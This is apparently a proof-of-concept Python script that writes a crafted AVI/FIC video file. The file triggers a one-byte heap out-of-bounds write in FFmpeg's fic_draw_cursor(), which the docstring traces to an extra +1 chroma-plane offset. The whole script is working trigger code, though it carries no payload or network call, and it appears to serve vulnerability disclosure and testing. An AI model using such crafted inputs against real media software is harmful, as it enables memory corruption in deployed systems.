#!/usr/bin/env python3
"""
PoC generator for VULN 002: 1-Byte Heap OOB Write in fic_draw_cursor()
chroma plane due to spurious +1 offset.

In fic_draw_cursor() (libavcodec/fic.c lines 247-250):
    dstptr[i] = ctx->final_frame->data[i]
              + (ctx->final_frame->linesize[i] * (cur_y >> !!i))
              + (cur_x >> !!i) + !!i;

For i=1 (Cb) and i=2 (Cr), !!i==1 adds an extra +1 byte offset.
With width=64 (linesize[1]==32), cur_x=62, cur_y=62:
    dstptr[1] = data[1] + 32*31 + 31 + 1 = data[1] + 1024

The Cb plane is exactly 1024 bytes (32*32), so this points 1 byte past the end.
fic_alpha_blend then writes 1 byte there (OOB write).
"""

import struct
import sys
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002_input.fic")

# FIC codec constants (from fic.c)
FIC_HEADER_SIZE = 27     # bytes 0-26
CURSOR_OFFSET   = 59     # cursor bitmap starts at byte 59 in the packet
CURSOR_SIZE     = 4096   # 32*32 pixels * 4 bytes BGRA

# Frame dimensions chosen to maximize OOB likelihood
# width=64: linesize[1] = 32 (exactly width/2, no alignment slack)
# height=64: valid (multiple of 16)
WIDTH  = 64
HEIGHT = 64
FPS    = 30

# Cursor position for OOB trigger
# cur_y=62: avctx->height - cur_y = 2, loop runs once (i=0 < 1)
# cur_x=62: lsize=2, csize=1, writes 1 byte at dstptr[1]
CUR_X = 62
CUR_Y = 62

# tsize = cursor section size = 32 bytes metadata + 4096 bytes bitmap
TSIZE = 32 + CURSOR_SIZE  # = 4128

# Number of slices
NSLICES = 1

# ------------------------------------------------------------------
# Build FIC raw frame packet
# ------------------------------------------------------------------
def build_fic_packet():
    # --- 27-byte FIC main header ---
    hdr = bytearray(FIC_HEADER_SIZE)
    # bytes 0-6: magic
    hdr[0:7] = bytes([0, 0, 1, ord('F'), ord('I'), ord('C'), ord('V')])
    # byte 13: nslices
    hdr[13] = NSLICES
    # byte 17: 0 = not a skip frame (we want to actually decode)
    hdr[17] = 0
    # byte 23: quality matrix (1 = HQ)
    hdr[23] = 1
    # bytes 24-26: tsize as big-endian 24-bit
    hdr[24] = (TSIZE >> 16) & 0xFF
    hdr[25] = (TSIZE >>  8) & 0xFF
    hdr[26] = (TSIZE >>  0) & 0xFF

    # --- Cursor section (TSIZE = 4128 bytes, starting at offset 27) ---
    # Relative offsets within cursor section:
    #   offset  0- 5 (abs 27-32): unknown/padding
    #   offset  6- 7 (abs 33-34): cur_x  (LE16)
    #   offset  8- 9 (abs 35-36): cur_y  (LE16)
    #   offset 10-11 (abs 37-38): cursor width  (LE16, must be 32)
    #   offset 12-13 (abs 39-40): cursor height (LE16, must be 32)
    #   offset 14-31 (abs 41-58): padding
    #   offset 32-4127 (abs 59-4154): BGRA cursor bitmap (CURSOR_SIZE bytes)
    cursor_section = bytearray(TSIZE)
    struct.pack_into('<H', cursor_section, 6,  CUR_X)
    struct.pack_into('<H', cursor_section, 8,  CUR_Y)
    struct.pack_into('<H', cursor_section, 10, 32)   # cursor width  = 32
    struct.pack_into('<H', cursor_section, 12, 32)   # cursor height = 32
    # Cursor bitmap: opaque mid-gray pixels so alpha_blend actually writes
    # B=128 G=128 R=128 A=255 for all 1024 pixels
    for px in range(CURSOR_SIZE // 4):
        off = 32 + px * 4
        cursor_section[off    ] = 128  # B
        cursor_section[off + 1] = 128  # G
        cursor_section[off + 2] = 128  # R
        cursor_section[off + 3] = 255  # A (fully opaque → triggers the blend/write)

    # --- Slice offset table (4 bytes per slice, big-endian) ---
    # Single slice, starting at offset 0 within sdata
    slice_table = struct.pack('>I', 0)

    # --- Slice data (96 non-skip DCT blocks, 1 byte each) ---
    # For width=64, height=64, 1 slice:
    #   Y plane:  (64/8)*(64/8) = 64 blocks
    #   Cb plane: (32/8)*(32/8) = 16 blocks
    #   Cr plane: 16 blocks
    #   Total: 96 blocks
    # Each non-skip zero-coeff block = 1 byte 0x00:
    #   MSB (bit7)=0  → not skip
    #   bits6-0=0     → num_coeff=0 (empty block, output = 0)
    TOTAL_BLOCKS = (WIDTH // 8) * (HEIGHT // 8) + 2 * ((WIDTH // 16) * (HEIGHT // 16))
    slice_data = bytes(TOTAL_BLOCKS)  # 96 zero bytes

    # msize = len(slice_data) must be > aligned_w/8 * aligned_h/8 / 8 = 8
    assert len(slice_data) > 8, "slice_data too small"

    packet = bytes(hdr) + bytes(cursor_section) + slice_table + slice_data

    # Validate CURSOR_OFFSET + CURSOR_SIZE <= len(packet) (checked in fic_decode_frame)
    assert len(packet) >= CURSOR_OFFSET + CURSOR_SIZE, (
        f"packet too small: {len(packet)} < {CURSOR_OFFSET + CURSOR_SIZE}")

    print(f"[+] FIC packet: {len(packet)} bytes")
    print(f"    tsize={TSIZE}, nslices={NSLICES}, cur_x={CUR_X}, cur_y={CUR_Y}")
    print(f"    OOB target: Cb/Cr plane offset {WIDTH//2 * HEIGHT//2} (= linesize[1]*height/2)")
    return packet


# ------------------------------------------------------------------
# Build minimal AVI container
# ------------------------------------------------------------------
def avi_chunk(tag, data):
    """Build a RIFF chunk: FourCC + LE32 size + data."""
    assert len(tag) == 4
    return tag.encode() + struct.pack('<I', len(data)) + data

def avi_list(list_type, data):
    """Build a LIST chunk: 'LIST' + LE32 (4 + len(data)) + type + data."""
    assert len(list_type) == 4
    return b'LIST' + struct.pack('<I', 4 + len(data)) + list_type.encode() + data

def build_avi(frame_data):
    buf_size = len(frame_data)

    # AVIH (AVIMainHeader, 56 bytes)
    avih = struct.pack('<IIIIIIII',
        1_000_000 // FPS,  # dwMicroSecPerFrame
        0,                  # dwMaxBytesPerSec
        0,                  # dwPaddingGranularity
        0x10,               # dwFlags (AVIF_HASINDEX)
        1,                  # dwTotalFrames
        0,                  # dwInitialFrames
        1,                  # dwStreams
        buf_size,           # dwSuggestedBufferSize
    )
    avih += struct.pack('<II', WIDTH, HEIGHT)  # dwWidth, dwHeight
    avih += bytes(16)                          # dwReserved[4]
    assert len(avih) == 56

    # STRH (AVIStreamHeader, 56 bytes)
    strh  = b'vids'                            # fccType
    strh += b'FICV'                            # fccHandler
    strh += struct.pack('<I', 0)               # dwFlags
    strh += struct.pack('<HH', 0, 0)           # wPriority, wLanguage
    strh += struct.pack('<I', 0)               # dwInitialFrames
    strh += struct.pack('<II', 1, FPS)         # dwScale, dwRate
    strh += struct.pack('<II', 0, 1)           # dwStart, dwLength
    strh += struct.pack('<I', buf_size)        # dwSuggestedBufferSize
    strh += struct.pack('<I', 0xFFFFFFFF)      # dwQuality
    strh += struct.pack('<I', 0)               # dwSampleSize
    strh += struct.pack('<hhhh', 0, 0, WIDTH, HEIGHT)  # rcFrame
    assert len(strh) == 56

    # STRF = BITMAPINFOHEADER (40 bytes)
    ficv_tag = int.from_bytes(b'FICV', 'little')
    strf = struct.pack('<IiiHHIIiiII',
        40,               # biSize
        WIDTH,            # biWidth
        HEIGHT,           # biHeight
        1,                # biPlanes
        24,               # biBitCount
        ficv_tag,         # biCompression = 'FICV'
        WIDTH*HEIGHT*3,   # biSizeImage
        0, 0, 0, 0,       # xpels, ypels, clrUsed, clrImportant
    )
    assert len(strf) == 40

    strl  = avi_chunk('strh', strh) + avi_chunk('strf', strf)
    hdrl  = avi_chunk('avih', avih) + avi_list('strl', strl)
    movi  = avi_chunk('00dc', frame_data)

    avi_body = avi_list('hdrl', hdrl) + avi_list('movi', movi)
    riff_body = b'AVI ' + avi_body
    return b'RIFF' + struct.pack('<I', len(riff_body)) + riff_body


# ------------------------------------------------------------------
# Main
# ------------------------------------------------------------------
if __name__ == '__main__':
    frame = build_fic_packet()
    avi   = build_avi(frame)
    with open(OUT, 'wb') as f:
        f.write(avi)
    print(f"[+] Written {len(avi)} bytes to {OUT}")
    print("[+] Trigger: OOB write at Cb plane offset 1024 (= linesize[1]*height/2)")
    print("    linesize[1]=32, cur_x/2+1=32 → dstptr[1] = data[1]+1024 (1 byte past end)")
